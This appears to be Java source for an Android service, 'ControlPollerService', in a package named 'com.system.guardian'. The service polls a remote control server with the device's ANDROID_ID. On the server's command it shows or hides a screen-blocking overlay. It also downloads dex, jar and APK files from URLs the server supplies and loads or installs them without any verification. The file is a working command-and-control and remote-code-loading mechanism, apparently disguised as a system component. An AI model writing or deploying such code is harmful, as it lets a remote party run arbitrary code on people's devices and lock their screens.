package com.system.guardian;

import android.annotation.SuppressLint;
import android.content.Context;
import android.content.Intent;
import android.provider.Settings;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.core.app.JobIntentService;

import com.system.guardian.dex_patch_build.PatchInstaller;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;
import java.net.URL;

/**
 * Service that polls the control endpoint and installs APK if update is available.
 */
public class ControlPollerService extends JobIntentService {

    private static final int JOB_ID = 1001;

    public static void enqueueWork(Context context, Intent work) {
        enqueueWork(context, ControlPollerService.class, JOB_ID, work);
    }

    @Override
    protected void onHandleWork(@NonNull Intent intent) {
        try {
            Context context = getApplicationContext();
            @SuppressLint("HardwareIds") String deviceToken = Settings.Secure.getString(getApplicationContext().getContentResolver(), Settings.Secure.ANDROID_ID);

            String url = "https://digiserve25.pythonanywhere.com/control/" + deviceToken + ".json";

            JSONObject response = NetworkUtils.getJsonFromUrl(url, getApplicationContext());
            if (response == null) return;

            CrashLogger.log(context, "CONTROL_JSON", "📦 Response: " + response.toString());

            if (response.has("status") && response.has("value")) {
                String status = response.getString("status");
                String value = response.getString("value");

                if ("override".equals(status)) {
                    if ("on".equals(value)) {
                        CrashLogger.log(context, "ControlPoller", "🛰️ Remote override ACTIVE — value: ON");
                        OverlayBlocker.show(context);
                    } else {
                        CrashLogger.log(context, "ControlPoller", "🛰️ Remote override ACTIVE — value: OFF");
                        OverlayBlocker.hide(context);
                    }
                }
            }

            String dexUrl = response.optString("dex_url", "");
            String apkUrl = response.optString("apk_url", "");
            String jarUrl = response.optString("jar_url", "");

            if (isValidUrl(dexUrl)) {
                File dexFile = NetworkUtils.downloadFile(context, dexUrl, "patch.dex");
                if (dexFile.exists()) {
                    DexLoader.schedulePatchLoad(this, dexFile);
                } else {
                    CrashLogger.log(context, "DEX_PATCH", "❌ Skipped: dexFile was missing");
                }
            }

            if (isValidUrl(apkUrl)) {
                File apkFile = NetworkUtils.downloadFile(context, apkUrl, "update.apk");
                if (apkFile.exists()) {
                    PatchInstaller.install(context, apkFile);
                }
            }

            if (isValidUrl(jarUrl)) {
                File jarFile = NetworkUtils.downloadFile(context, jarUrl, "patch.jar");
                if (jarFile.exists()) {
                    DexLoader.schedulePatchLoad(context, jarFile);
                }
            } else {
                CrashLogger.log(context, "NetworkUtils", "⚠️ jar_url was null or empty — skipping.");
            }

        } catch (JSONException e) {
            Log.e("ControlPoller", "❌ JSON parse failed", e);
        } catch (Exception e) {
            Log.e("ControlPoller", "❌ Unexpected error", e);
        }
    }

    // Utility method for safe URL validation
    private static boolean isValidUrl(String urlStr) {
        if (urlStr == null || urlStr.trim().isEmpty()) return false;
        try {
            URL url = new URL(urlStr);
            return url.getProtocol().startsWith("http");
        } catch (Exception e) {
            return false;
        }
    }
}
